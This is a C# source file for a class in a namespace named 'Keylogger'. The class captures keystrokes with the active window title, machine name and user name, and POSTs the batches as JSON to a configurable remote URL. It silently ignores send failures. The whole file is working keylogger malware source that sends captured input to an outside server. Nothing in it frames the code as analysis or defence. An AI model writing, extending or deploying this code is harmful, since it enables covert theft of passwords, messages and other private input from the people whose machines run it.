using System;
using Newtonsoft.Json;
using System.Windows.Forms;
using System.Net.Http;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Logger
    {
        LoggerData loggerData;
        string computerName;
        HttpClient client;
        string URL;
        bool debug;

        public Logger(string URL, bool debug)
        {
            this.debug = debug;
            this.URL = URL;
            computerName = Environment.MachineName + " - " + Environment.UserName;
            client = new HttpClient();
        }

        public void KeyDown(CatcherEventArgs args)
        {
            string key = "";
            if(args.Key == Keys.Enter)
            {
                key = "[Enter]";
            }
            else if (args.Key == Keys.Back)
            {
                key = "[Back]";
            }
            else if (args.Key == Keys.Escape)
            {
                key = "[Esc]";
            }
            else if (!args.IsSystemKey)
            {
                key = args.UnicodeValue;
            }   
            
            
            if(key != "" && loggerData != null && args.WindowName == loggerData.WindowName)
            {
                loggerData.Keys += key;
            }
            else if(key != "")
            {
                if(loggerData != null)
                {
                    if (debug)
                    {
                        Console.WriteLine("[{0}]", loggerData.WindowName);
                        Console.WriteLine(loggerData.Keys);
                    }
                    Send(loggerData);
                }

                loggerData = new LoggerData(computerName, args.WindowName, key);
            }
        }

        void Send(LoggerData loggerData)
        {
            try
            {
                Task result = client.PostAsync(URL,
                                           new StringContent(JsonConvert.SerializeObject(loggerData),
                                                             Encoding.UTF8,
                                                             "application/json"));
                result.Start();
            }
            catch { }
        }
        public void KeyUp(CatcherEventArgs args)
        {

        }
    }
}
